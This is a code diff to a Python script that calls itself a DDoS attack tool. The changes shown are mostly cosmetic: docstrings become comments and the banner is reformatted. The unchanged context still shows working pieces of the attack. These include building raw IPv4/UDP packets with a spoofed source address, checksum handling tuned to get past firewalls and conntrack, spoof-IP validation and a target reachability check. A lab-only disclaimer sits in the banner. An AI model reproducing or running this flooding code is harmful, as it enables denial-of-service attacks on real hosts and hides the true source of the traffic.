@@ -13,15 +13,14 @@ import platform
 
 # ==================== Cross-platform clear screen ====================
 def clear_screen():
+    # Clear screen, compatible with Windows (cls) and Unix-like (clear)
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
 # ==================== Checksum computation ====================
 def ip_checksum(data: bytes) -> int:
-    """
-    Standard 16-bit one's complement checksum (RFC 1071).
-    Used for IP header or UDP pseudo-header + UDP header + payload.
-    """
+    # Standard 16-bit one's complement checksum (RFC 1071)
+    # Used for IP header or UDP pseudo-header + UDP header + payload
     if len(data) % 2:
         data += b'\x00'
     s = 0
@@ -32,26 +31,22 @@ def ip_checksum(data: bytes) -> int:
 
 
 def udp_checksum(src_ip: str, dst_ip: str, udp_header: bytes, payload: bytes) -> int:
-    """
-    UDP checksum: needs pseudo-header (src + dst + zero + proto + udp_len).
-    The udp_header must have its checksum field set to 0 on input.
-    """
+    # UDP checksum needs pseudo-header (src + dst + zero + proto + udp_len)
+    # The udp_header must have its checksum field set to 0 on input
     pseudo = (socket.inet_aton(src_ip) +
               socket.inet_aton(dst_ip) +
               b'\x00\x11' +
               struct.pack('!H', len(udp_header) + len(payload)))
     result = ip_checksum(pseudo + udp_header + payload)
-    # UDP checksum 0 means "not computed"; receivers skip validation.
-    # To avoid being dropped by firewalls/conntrack, use 0xFFFF when result is 0.
+    # UDP checksum 0 means "not computed"; receivers skip validation
+    # To avoid being dropped by firewalls/conntrack, use 0xFFFF when result is 0
     return result if result != 0 else 0xFFFF
 
 
 # ==================== Local network detection ====================
 def get_local_ip_and_subnet():
-    """
-    Probe local egress IP via UDP connect (no actual packets sent).
-    Returns (ip_str, ip_network), or (None, None) on failure.
-    """
+    # Probe local egress IP via UDP connect (no actual packets sent)
+    # Returns (ip_str, ip_network), or (None, None) on failure
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.settimeout(0.1)
@@ -67,10 +62,8 @@ def get_local_ip_and_subnet():
 
 # ==================== Spoof IP validation ====================
 def validate_spoof_ip(spoof_ip: str, target_ip: str, local_net) -> tuple:
-    """
-    Returns (is_valid, message).
-    message may be a warning (still allowed) or a rejection reason.
-    """
+    # Returns (is_valid, message)
+    # message may be a warning (still allowed) or a rejection reason
     try:
         s = ipaddress.ip_address(spoof_ip)
         t = ipaddress.ip_address(target_ip)
@@ -107,10 +100,8 @@ def validate_spoof_ip(spoof_ip: str, target_ip: str, local_net) -> tuple:
 def build_ip_udp_packet(spoof_ip: str, target_ip: str,
                         src_port: int, dst_port: int,
                         payload: bytes, ttl: int = 64) -> bytes:
-    """
-    Build a complete IPv4 + UDP packet with correct checksums.
-    DF bit forced (no fragmentation), so payload must be ≤ 1472 bytes.
-    """
+    # Build a complete IPv4 + UDP packet with correct checksums
+    # DF bit forced (no fragmentation), so payload must be <= 1472 bytes
     ip_header_len = 20
     udp_header_len = 8
     total_len = ip_header_len + udp_header_len + len(payload)
@@ -151,6 +142,7 @@ def build_ip_udp_packet(spoof_ip: str, target_ip: str,
 
 # ==================== TCP reachability check ====================
 def check_target(ip: str, port: int, timeout: float = 1.0) -> bool:
+    # Simple TCP connection test
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
@@ -172,9 +164,8 @@ def show_banner():
     print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
     print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
     print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
-    print("==================== SEVERE WARNING ======================")
-    print("You are crossing the legal and ethical boundary. ")
-    print("Exit now, or wait 3s.")
+    print("==================== SEVERE WARNING =====================")
+    print("You are crossing the legal and ethical boundary. Exit now, or wait 3s.")
     print("Authorized isolated lab environments only.")
     print("=========================================================")
     time.sleep(1)
@@ -191,11 +182,11 @@ def show_banner():
         print(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
         print(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
         print(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
-        print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")       
-    print("===========================================================================")
+        print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")
+    print("==================================================================")
     print("Author  : Su-StackTrace")
     print("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
-    print("===========================================================================")
+    print("==================================================================")
     print("")
 
 
@@ -338,7 +329,7 @@ def main():
     if not use_spoof:
         print("[>] Checking target reachability (TCP)...")
         if not check_target(target_ip, target_port):
-            print("[!] TCP unreachable (note: TCP reachable ≠ UDP reachable)")
+            print("[!] TCP unreachable (note: TCP reachable != UDP reachable)")
             choice = input("[?] Continue anyway? (y/N): ").strip().lower()
             if choice != 'y':
                 print("[>] Cancelled")
